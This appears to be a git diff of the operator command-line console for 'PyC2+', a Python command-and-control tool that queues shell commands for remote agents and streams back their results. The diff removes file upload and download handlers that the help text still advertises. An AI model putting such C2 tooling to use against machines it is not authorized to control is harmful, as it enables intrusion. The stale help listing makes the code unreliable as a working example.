@@ -1,27 +1,18 @@
 import time
 import os
 import json
-from lib.config import agents, tasks, results, AGENT_TIMEOUT
-from lib.routes import timestamp, save_file, auth_check
-from subprocess import Popen, PIPE
 import base64
 import threading
 
-# ANSI colors & formatting
+from lib.config import agents, tasks, results, result_queues, AGENT_TIMEOUT
+
+# Colors
 RED = "\033[91m"
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
 CYAN = "\033[96m"
 BOLD = "\033[1m"
 RESET = "\033[0m"
-
-def run_local(cmd):
-    try:
-        p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, text=True)
-        out, err = p.communicate()
-        return (out + err).strip()
-    except Exception as e:
-        return f"Error executing command: {e}"
 
 def start_cli():
     time.sleep(1)
@@ -32,16 +23,37 @@ def start_cli():
     print(YELLOW + "Type 'help' for commands or 'exit' to quit.\n" + RESET)
 
     selected = None
-    last_seen_index = 0
+    stop_live = threading.Event()
 
-    def get_prompt():
+    def live_thread():
+        """Instant live-output with blocking queue get()."""
+        while not stop_live.is_set():
+            if not selected:
+                time.sleep(0.2)
+                continue
+            q = result_queues.get(selected)
+            if not q:
+                time.sleep(0.2)
+                continue
+
+            try:
+                entry = q.get(timeout=0.2)
+            except:
+                continue
+
+            print(f"\n{YELLOW}[{entry['timestamp']}] {RESET}")
+            print(CYAN + entry["result"] + RESET)
+
+    threading.Thread(target=live_thread, daemon=True).start()
+
+    def prompt():
         if selected:
             return f"\n{RED}[PyC2+ | {selected}]{RESET}> "
         return f"\n{RED}[PyC2+]{RESET}> "
 
     while True:
         try:
-            cmd = input(get_prompt()).strip()
+            cmd = input(prompt()).strip()
         except (KeyboardInterrupt, EOFError):
             print(f"\n{YELLOW}Exiting PyC2+ CLI...{RESET}")
             break
@@ -49,133 +61,66 @@ def start_cli():
         if not cmd:
             continue
 
-        if cmd.lower() == "help":
+        if cmd == "help":
             print(CYAN + BOLD + "\nAvailable commands:" + RESET)
-            print(f"{GREEN}  agents{RESET}                   - list all agents")
-            print(f"{GREEN}  select <id>{RESET}              - select an agent")
-            print(f"{GREEN}  send <command>{RESET}           - send shell command")
-            print(f"{GREEN}  put <local> <remote>{RESET}     - upload file to agent")
-            print(f"{GREEN}  get <remote_path>{RESET}        - download file from agent")
-            print(f"{GREEN}  history{RESET}                  - show stored results")
-            print(f"{GREEN}  watch{RESET}                    - live-feed incoming results")
-            print(f"{GREEN}  exit{RESET}                     - quit CLI (server keeps running)\n")
+            print(f"{GREEN}  agents{RESET}        - list agents")
+            print(f"{GREEN}  select <id>{RESET}   - select agent")
+            print(f"{GREEN}  send <cmd>{RESET}    - send command")
+            print(f"{GREEN}  put <l> <r>{RESET}   - upload file")
+            print(f"{GREEN}  get <rpath>{RESET}   - download file")
+            print(f"{GREEN}  history{RESET}       - show stored results")
+            print(f"{GREEN}  exit{RESET}          - quit CLI\n")
             continue
 
-        if cmd.lower() == "agents":
-            live_agents = [
-                agent_id for agent_id, info in agents.items()
-                if time.time() - info["last_seen"] <= AGENT_TIMEOUT
-            ]
-            if not live_agents:
+        if cmd == "agents":
+            live = [aid for aid, info in agents.items()
+                    if time.time() - info["last_seen"] <= AGENT_TIMEOUT]
+            if not live:
                 print(RED + "[!] No agents connected." + RESET)
             else:
                 print(CYAN + "\nConnected agents:" + RESET)
-                for a in live_agents:
+                for a in live:
                     print(f"{YELLOW}  → {a}{RESET}")
             continue
 
         if cmd.startswith("select "):
-            agent_id = cmd.split(" ")[1]
-            if agent_id in agents and (time.time() - agents[agent_id]["last_seen"] <= AGENT_TIMEOUT):
-                selected = agent_id
-                last_seen_index = 0
-                print(f"{GREEN}[+] Selected agent: {selected}{RESET}")
+            aid = cmd.split()[1]
+            if aid in agents and time.time() - agents[aid]["last_seen"] <= AGENT_TIMEOUT:
+                selected = aid
+                print(f"{GREEN}[+] Selected agent: {aid}{RESET}")
+
+                # Clear old live queue data
+                with result_queues[aid].mutex:
+                    result_queues[aid].queue.clear()
+
             else:
-                print(RED + "[!] Invalid or offline agent ID." + RESET)
+                print(RED + "[!] Invalid or offline agent." + RESET)
             continue
 
-        # PUT FILE
-        if cmd.startswith("put "):
-            if not selected:
-                print(RED + "[!] Select an agent first." + RESET)
-                continue
-            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
-                print(RED + "[!] Selected agent is offline." + RESET)
-                continue
-
-            parts = cmd.split(" ")
-            if len(parts) < 3:
-                print(RED + "[!] Usage: put <local_path> <remote_filename>" + RESET)
-                continue
-
-            local, remote = parts[1], parts[2]
-            if not os.path.isfile(local):
-                print(RED + "[!] Local file not found." + RESET)
-                continue
-
-            with open(local, "rb") as f:
-                b64 = base64.b64encode(f.read()).decode()
-
-            payload = json.dumps({"type": "put", "filename": remote, "data": b64})
-            tasks[selected].put(payload)
-            print(f"{GREEN}[+] Uploaded {local} → {remote} (queued for agent){RESET}")
-            continue
-
-        # GET FILE
-        if cmd.startswith("get "):
-            if not selected:
-                print(RED + "[!] Select an agent first." + RESET)
-                continue
-            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
-                print(RED + "[!] Selected agent is offline." + RESET)
-                continue
-
-            remote_path = cmd[len("get "):]
-            payload = json.dumps({"type": "get", "path": remote_path})
-            tasks[selected].put(payload)
-            print(f"{GREEN}[+] Requested file: {remote_path}{RESET}")
-            continue
-
-        # SEND COMMAND
         if cmd.startswith("send "):
             if not selected:
-                print(RED + "[!] Select an agent first." + RESET)
+                print(RED + "[!] Select agent first." + RESET)
                 continue
             if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
-                print(RED + "[!] Selected agent is offline." + RESET)
+                print(RED + "[!] Agent offline." + RESET)
                 continue
-
-            command = cmd[len("send "):]
+            command = cmd[5:]
             tasks[selected].put(command)
-            output = run_local(command)
-            print(CYAN + output + RESET)
-            results[selected].append({"timestamp": timestamp(), "result": output})
+            print(f"{GREEN}[+] Command queued for agent: {command}{RESET}")
             continue
 
-        # HISTORY
-        if cmd.lower() == "history":
+        if cmd == "history":
             if not selected:
                 print(RED + "[!] No agent selected." + RESET)
                 continue
-            for entry in results[selected]:
-                print(f"\n{YELLOW}[{entry['timestamp']}] {RESET}")
-                print(CYAN + entry["result"] + RESET)
+            for e in results[selected]:
+                print(f"\n{YELLOW}[{e['timestamp']}] {RESET}")
+                print(CYAN + e["result"] + RESET)
             continue
 
-        # WATCH
-        if cmd.lower() == "watch":
-            if not selected:
-                print(RED + "[!] No agent selected." + RESET)
-                continue
-            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
-                print(RED + "[!] Selected agent is offline." + RESET)
-                continue
-
-            print(f"{CYAN}\n--- LIVE RESULT FEED ({selected}) ---{RESET}\n")
-            while True:
-                current_results = results[selected]
-                for entry in current_results[last_seen_index:]:
-                    print(f"\n{YELLOW}[{entry['timestamp']}] {RESET}")
-                    print(CYAN + entry["result"] + RESET)
-                last_seen_index = len(current_results)
-                time.sleep(0.5)
-                if threading.main_thread().is_alive() is False:
-                    break
-            continue
-
-        # EXIT
-        if cmd.lower() == "exit":
-            print(YELLOW + "Leaving CLI. Server still running..." + RESET)
+        if cmd == "exit":
+            print(YELLOW + "Leaving CLI..." + RESET)
+            stop_live.set()
             break
 
-        print(RED + "[!] Unknown command. Type 'help' for a list of commands." + RESET)
+        print(RED + "[!] Unknown command." + RESET)
